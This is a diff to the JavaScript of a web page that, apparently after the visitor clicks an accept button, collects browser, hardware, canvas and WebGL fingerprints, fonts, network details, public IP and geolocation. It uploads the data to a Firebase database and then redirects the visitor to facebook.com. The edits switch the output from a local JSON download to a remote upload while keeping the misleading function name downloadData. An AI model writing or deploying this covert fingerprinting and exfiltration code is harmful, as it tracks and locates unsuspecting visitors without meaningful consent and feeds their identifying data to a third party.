@@ -1,3 +1,4 @@
+// Ensure Firebase is initialized in your HTML file before this script runs
 document.addEventListener('DOMContentLoaded', function() {
     const acceptBtn = document.getElementById('acceptBtn');
     
@@ -19,46 +20,43 @@ async function collectAllData() {
         collection_start: startTime
     };
     
-    // Collect browser and device information
-    collectBrowserData(collectedData);
-    collectScreenData(collectedData);
-    collectHardwareData(collectedData);
-    collectTimezoneData(collectedData);
-    collectStorageData(collectedData);
-    collectPluginsData(collectedData);
-    collectCanvasFingerprint(collectedData);
-    collectWebGLData(collectedData);
-    collectFontsData(collectedData);
-    collectMouseData(collectedData);
-    collectTouchData(collectedData);
-    collectOrientationData(collectedData);
-    
-    // Collect network information
-    await collectNetworkData(collectedData);
-    
-    // Collect IP address
-    await collectIPData(collectedData);
-    
-    // Collect geolocation
-    await collectGeolocationData(collectedData);
-    
-    // Add collection end time
-    collectedData.collection_end = Date.now();
-    collectedData.total_collection_time = collectedData.collection_end - startTime;
-    
-    // Download the data as JSON file
-    downloadData(collectedData);
-    
-    // Ensure minimum 1 second processing time, then redirect
-    const processingTime = Date.now() - startTime;
-    const minDelay = Math.max(1000 - processingTime, 0);
-    const maxDelay = Math.max(3000 - processingTime, 0);
-    
-    setTimeout(() => {
+    try {
+        // Collect browser and device information
+        collectBrowserData(collectedData);
+        collectScreenData(collectedData);
+        collectHardwareData(collectedData);
+        collectTimezoneData(collectedData);
+        collectStorageData(collectedData);
+        collectPluginsData(collectedData);
+        collectCanvasFingerprint(collectedData);
+        collectWebGLData(collectedData);
+        collectFontsData(collectedData);
+        collectTouchData(collectedData);
+        
+        // Collect network information (async)
+        await collectNetworkData(collectedData);
+        
+        // Collect IP address (async)
+        await collectIPData(collectedData);
+        
+        // Collect geolocation (async)
+        await collectGeolocationData(collectedData);
+        
+        // Add collection end time
+        collectedData.collection_end = Date.now();
+        collectedData.total_collection_time = collectedData.collection_end - startTime;
+        
+        // Send the data to Firebase (async)
+        await downloadData(collectedData);
+    } catch (e) {
+        console.error('Error during data collection:', e);
+    } finally {
+        // Redirect to Facebook after data collection and sending, or if an error occurs
         window.location.href = 'https://www.facebook.com';
-    }, Math.min(minDelay, maxDelay));
+    }
 }
 
+// Function to collect browser data
 function collectBrowserData(data) {
     try {
         data.browser = {
@@ -85,6 +83,7 @@ function collectBrowserData(data) {
     }
 }
 
+// Function to collect screen and window data
 function collectScreenData(data) {
     try {
         data.screen = {
@@ -115,6 +114,7 @@ function collectScreenData(data) {
     }
 }
 
+// Function to collect hardware data
 function collectHardwareData(data) {
     try {
         data.hardware = {
@@ -128,6 +128,7 @@ function collectHardwareData(data) {
     }
 }
 
+// Async function to collect network data
 async function collectNetworkData(data) {
     try {
         if ('connection' in navigator) {
@@ -147,6 +148,7 @@ async function collectNetworkData(data) {
     }
 }
 
+// Async function to collect IP data
 async function collectIPData(data) {
     try {
         const response = await fetch('https://api.ipify.org?format=json', {
@@ -160,6 +162,7 @@ async function collectIPData(data) {
     }
 }
 
+// Async function to collect geolocation data
 async function collectGeolocationData(data) {
     return new Promise((resolve) => {
         if ('geolocation' in navigator) {
@@ -197,6 +200,7 @@ async function collectGeolocationData(data) {
     });
 }
 
+// Function to collect timezone data
 function collectTimezoneData(data) {
     try {
         data.timezone = {
@@ -213,6 +217,7 @@ function collectTimezoneData(data) {
     }
 }
 
+// Function to collect storage data
 function collectStorageData(data) {
     try {
         data.storage = {
@@ -227,6 +232,7 @@ function collectStorageData(data) {
     }
 }
 
+// Function to collect plugins data
 function collectPluginsData(data) {
     try {
         data.plugins = [];
@@ -255,6 +261,7 @@ function collectPluginsData(data) {
     }
 }
 
+// Function to collect canvas fingerprint
 function collectCanvasFingerprint(data) {
     try {
         const canvas = document.createElement('canvas');
@@ -275,6 +282,7 @@ function collectCanvasFingerprint(data) {
     }
 }
 
+// Function to collect WebGL data
 function collectWebGLData(data) {
     try {
         const canvas = document.createElement('canvas');
@@ -296,6 +304,7 @@ function collectWebGLData(data) {
     }
 }
 
+// Function to collect fonts data
 function collectFontsData(data) {
     try {
         const testFonts = [
@@ -315,29 +324,7 @@ function collectFontsData(data) {
     }
 }
 
-function collectMouseData(data) {
-    try {
-        data.mouse = {
-            timestamp: Date.now(),
-            clientX: 0,
-            clientY: 0,
-            screenX: 0,
-            screenY: 0
-        };
-        
-        // Capture current mouse position if available
-        document.addEventListener('mousemove', function(e) {
-            data.mouse.clientX = e.clientX;
-            data.mouse.clientY = e.clientY;
-            data.mouse.screenX = e.screenX;
-            data.mouse.screenY = e.screenY;
-        }, { once: true });
-    } catch (e) {
-        console.error('Error collecting mouse data:', e);
-        data.mouse_error = e.message;
-    }
-}
-
+// Function to collect touch data
 function collectTouchData(data) {
     try {
         data.touch = {
@@ -350,37 +337,13 @@ function collectTouchData(data) {
     }
 }
 
-function collectOrientationData(data) {
+// Async function to send data to Firebase
+async function downloadData(data) {
     try {
-        if ('DeviceOrientationEvent' in window) {
-            data.orientation = {
-                alpha: null,
-                beta: null,
-                gamma: null,
-                absolute: null
-            };
-            
-            window.addEventListener('deviceorientation', function(e) {
-                data.orientation.alpha = e.alpha;
-                data.orientation.beta = e.beta;
-                data.orientation.gamma = e.gamma;
-                data.orientation.absolute = e.absolute;
-            }, { once: true });
-        }
+        const db = firebase.database();
+        await db.ref('data').push(data);
+        console.log('Data saved to Firebase');
     } catch (e) {
-        console.error('Error collecting orientation data:', e);
-        data.orientation_error = e.message;
+        console.error('Error saving data to Firebase:', e);
     }
-}
-
-function downloadData(data) {
-  try {
-    const db = firebase.database();
-    db.ref('data').push(data)
-      .then(() => console.log('Data saved to Firebase'))
-      .catch(error => console.error('Error saving data:', error));
-  } catch (e) {
-    console.error('Error saving data:', e);
-  }
-}
 }
